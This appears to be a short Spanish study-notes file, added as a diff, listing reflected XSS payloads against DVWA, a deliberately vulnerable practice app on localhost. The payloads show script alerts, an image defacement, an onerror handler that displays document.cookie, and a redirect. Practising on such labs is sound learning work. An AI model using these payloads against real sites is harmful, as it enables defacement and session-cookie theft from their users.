@@ -1,0 +1,19 @@
+script Demo
+
+Indicar alerta
+<script>alert (1234)</script>#
+
+Arroja Mensaje
+<script>prompt('Mensaje')</script>#
+
+
+Etiqueta img cambiar imagen del sitio vulnerable
+http://localhost/DVWA/vulnerabilities/xss_r/?name=Cristian <img src="https://microteknologias.files.wordpress.com/2009/07/pwned.jpg" alt =#/>#
+
+Leer cookie asosiada
+http://localhost/DVWA/vulnerabilities/xss_r/?name=Cristian <img src/onerror=alert(document.cookie) /> 
+
+Redireccionamiento a otra pagina web, en este caso a Google
+http://localhost/DVWA/vulnerabilities/xss_r/?name=Cristian <script>document.location.href="https://www.google.com"</script>#
+ 
+ 
